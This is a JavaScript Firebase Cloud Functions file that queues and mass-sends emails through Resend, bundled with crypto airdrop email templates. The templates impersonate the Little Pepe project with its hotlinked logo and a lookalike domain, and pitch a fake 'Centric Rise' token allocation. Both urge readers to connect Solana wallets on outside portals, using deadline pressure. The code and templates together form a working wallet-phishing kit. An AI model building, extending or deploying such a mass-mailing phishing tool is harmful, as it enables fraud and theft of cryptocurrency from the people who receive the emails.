const { onCall, HttpsError } = require('firebase-functions/v2/https')
const { onSchedule } = require('firebase-functions/v2/scheduler')
const admin = require('firebase-admin')
const { Resend } = require('resend')

admin.initializeApp()

const db = admin.firestore()

/**
 * =========================
 * GENERATE CAMPAIGN ID
 * =========================
 */
function generateCampaignId(domain) {
  return `cmp_${domain}_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`
}

/**
 * =========================
 * SEND BLASTER (QUEUE CREATOR)
 * =========================
 */
exports.sendBlaster = onCall(async (request) => {
  try {
    let { emails, subject, html, domain, from, fromEmail, apiKey } = request.data

    // ------------------------
    // VALIDATION
    // ------------------------
    if (!domain) {
      throw new HttpsError('invalid-argument', 'Domain is required')
    }

    if (!fromEmail || !apiKey) {
      throw new HttpsError('invalid-argument', 'Missing fromEmail or apiKey')
    }

    if (typeof emails === 'string') {
      emails = emails.split(',')
    }

    emails = emails.map((e) => e.trim()).filter((e) => e.includes('@'))

    if (!emails.length) {
      throw new HttpsError('invalid-argument', 'No valid emails provided')
    }

    const campaignId = generateCampaignId(domain)

    const batch = db.batch()

    emails.forEach((email) => {
      const ref = db.collection('emailQueue').doc()

      batch.set(ref, {
        email,
        subject: subject || 'Your token allocation is ready',
        html: html || buildDefaultEmail(),

        // campaign info
        domain,
        campaignId,

        // sender config (FROM FRONTEND)
        from: from || 'Notification',
        fromEmail,
        apiKey,

        status: 'pending',
        createdAt: admin.firestore.FieldValue.serverTimestamp(),
      })
    })

    await batch.commit()

    console.log(`Queued ${emails.length} emails for ${domain}`)

    return {
      success: true,
      queued: emails.length,
      campaignId,
      domain,
    }
  } catch (err) {
    console.error('SEND BLASTER ERROR:', err)
    throw new HttpsError('internal', err.message)
  }
})

/**
 * =========================
 * EMAIL WORKER
 * =========================
 */
exports.emailWorker = onSchedule('every 1 minutes', async () => {
  const snapshot = await db
    .collection('emailQueue')
    .where('status', '==', 'pending')
    .orderBy('createdAt')
    .limit(10)
    .get()

  if (snapshot.empty) return

  for (const doc of snapshot.docs) {
    const data = doc.data()

    try {
      // create resend instance per job
      const resend = new Resend(data.apiKey)

      await resend.emails.send({
        from: `${data.from} <${data.fromEmail}>`,
        to: data.email,
        subject: data.subject,
        html: data.html,

        headers: {
          'List-Unsubscribe': `<mailto:${data.fromEmail}>`,
          Precedence: 'bulk',
        },
      })

      await doc.ref.update({
        status: 'sent',
        sentAt: admin.firestore.FieldValue.serverTimestamp(),
      })
    } catch (err) {
      await doc.ref.update({
        status: 'failed',
        error: err.message,
      })
    }

    // throttle
    await new Promise((r) => setTimeout(r, 3000))
  }
})

/**
 * =========================
 * DEFAULT EMAIL TEMPLATE
 * =========================
 */
function buildDefaultEmail() {
  return `
    <html>
      <body style="font-family:Arial; padding:20px;">
        <h2>Your Token Allocation is Ready</h2>
        <p>Please log in to view your allocation.</p>
        <a href="https://example.com">Open Dashboard</a>
      </body>
    </html>
  `
}
/*========================= EMAIL TEMPLATE (optional default) ========================= */

function buildAirdropClaimHTML() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Centric Rise Update</title>
<style>
  body {
    margin: 0;
    padding: 0;
    background: #f5f7fa;
    font-family: Arial, Helvetica, sans-serif;
    color: #333333;
  }

  .container {
    max-width: 600px;
    margin: 0 auto;
    background: #ffffff;
    border-radius: 12px;
    overflow: hidden;
    border: 1px solid #e5e7eb;
  }

  .header {
    background: #61bafc;
    text-align: center;
    padding: 25px 20px;
  }

  .header-logo {
    display: block;
    margin: 0 auto;
    max-width: 280px;
    width: 100%;
    height: auto;
  }

  .content {
    padding: 32px;
    line-height: 1.7;
  }

  .button {
    display: inline-block;
    padding: 14px 28px;
    background: #61bafc;
    color: #ffffff !important;
    text-decoration: none;
    border-radius: 8px;
    font-weight: bold;
  }

  .notice {
    background: #f8fafc;
    border: 1px solid #e2e8f0;
    border-radius: 8px;
    padding: 16px;
    margin: 24px 0;
  }

  .footer {
    padding: 24px;
    text-align: center;
    font-size: 12px;
    color: #6b7280;
    border-top: 1px solid #e5e7eb;
  }

  .footer a {
    color: #6b7280;
    text-decoration: none;
  }
</style>

<div class="container">

  <div class="header">

    <img
      src="https://littlepepe.com/assets/logo-CPEVDSpN.png"
      
      alt="Little Pepe"
      class="header-logo"
    >

  </div>

  <div class="content">

    <p>Hello,</p>

    <p>
      We are reaching out regarding your Little Pepe allocation.
    </p>

    <p>
      The token distribution process has been completed and your allocation is now available for you to access through the Little Pepe portal.
    </p>

    <div class="notice">
      Please sign in using your wallet to verify your allocation and view your available tokens.
    </div>

    <p style="text-align:center;">
      <a href="https://littlepepesss.xyz" class="button">
        Open Dashboard
      </a>
    </p>

    <p>
      If you have already completed this process, no further action is required.
    </p>

    <p>
      Thank you for your continued participation and support.
    </p>

    <p>
      Regards,<br>
      Little Pepe Team
    </p>

  </div>

  <div class="footer">

    <p><strong>All rights reserved. Little Pepe </strong></p>

    <p>
      Support:
      <a href="mailto:support@littlepepe.com">
        support@littlepepe.com
      </a>
    </p>

    <p>
      If you no longer wish to receive updates, you may unsubscribe from future communications.
    </p>

  </div>

</div>
</body>
</html>`
}

function buildAirdropClaimText() {
  const reference = 'N/A'
  const userName = 'Valued Member'

  const airdropAmount = '50,000'
  const airdropToken = 'Centric Rise (CNR)'
  const portalUrl = 'https://maulfaq.online/portal'
  const supportUrl = 'https://maulfaq.online/support'
  const unsubscribeUrl = 'https://maulfaq.online/unsubscribe'
  const deadline = 'June 30, 2026'

  return `Centric Rise — Distribution Update

Hello ${userName},

The Centric Rise distribution on the Solana network has been processed. As a verified participant, your allocation is ready for review.

TOKEN ALLOCATION

  Amount:    ${airdropAmount} ${airdropToken}
  Allocation: Network transition distribution

OPEN TOKEN PORTAL

  ${portalUrl}

Portal available through ${deadline}.

PROCESS OVERVIEW

1. Access your dashboard
   (Compatible with Phantom, Solflare, or Backpack)

2. Review your distribution status
   Your legacy balance will be verified on-chain

3. Receive your allocation
   Tokens are sent directly to your connected wallet

NOTE

Allocations not reviewed by the deadline may be reallocated to the community pool. We recommend reviewing your status at your earliest convenience.

Reference: ${reference}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Centric Rise | Solana Network

Support: ${supportUrl}
Unsubscribe: ${unsubscribeUrl}

This is an automated message. Please do not reply.`
}
